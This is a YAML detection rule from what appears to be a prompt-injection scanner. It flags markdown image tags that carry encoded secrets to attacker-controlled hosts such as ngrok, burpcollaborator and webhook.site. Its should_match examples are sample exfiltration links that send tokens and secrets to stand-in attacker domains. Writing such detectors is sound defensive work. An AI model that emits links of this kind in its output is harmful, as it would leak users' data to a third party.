version: 1.0.0
rule_id: pi-3028
family: PI
sub_family: indirect_injection
name: Detects markdown image exfiltration attempts
description: Detects attempts to exfiltrate data using markdown image tags with attacker-controlled domains and encoded data in URLs
severity: critical
confidence: 0.94
patterns:
- pattern: '!\[.*?\]\(https?://(?:[^/]+\.)?(?:ngrok|burpcollaborator|requestbin|webhook\.site|pipedream)[^)]*\)'
  flags:
  - IGNORECASE
  timeout: 5.0
- pattern: '!\[.*?\]\(https?://[^)]*(?:data|secret|token|key|password|api)=(?:[A-Za-z0-9+/=]{20,})[^)]*\)'
  flags:
  - IGNORECASE
  timeout: 5.0
- pattern: '!\[.*?\]\(https?://[^)]*\.(?:[A-Za-z0-9+/=]{20,})\.(?:burpcollaborator|ngrok|attacker)[^)]*\)'
  flags:
  - IGNORECASE
  timeout: 5.0
examples:
  should_match:
  - '![data](https://attacker.ngrok.io/exfil?data=aGVsbG8gd29ybGQ=)'
  - '![secret](https://test.burpcollaborator.net/steal?token=VGhpc0lzU2VjcmV0RGF0YQ==)'
  - '![img](https://webhook.site/capture?secret=c2VjcmV0X2FwaV9rZXk=)'
  - '![leak](https://attacker.com/exfil.abc123XYZ456def789.ngrok.io/capture)'
  should_not_match:
  - '![profile](https://example.com/image.png)'
  - '![logo](https://cdn.company.com/assets/logo.svg)'
  - Visit ngrok.com for tunneling solutions
  - Check out webhook.site for testing
metrics:
  precision: null
  recall: null
  f1_score: null
  last_evaluated: null
mitre_attack:
- T1041
- T1048
metadata:
  created: '2025-11-16'
  updated: '2025-11-16'
  author: raxe-ce
  references:
  - https://simonwillison.net/tags/markdown-exfiltration/
  - https://microsoft.com/en-us/msrc/blog/2025/07/how-microsoft-defends-against-indirect-prompt-injection-attacks
rule_hash: sha256:e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2
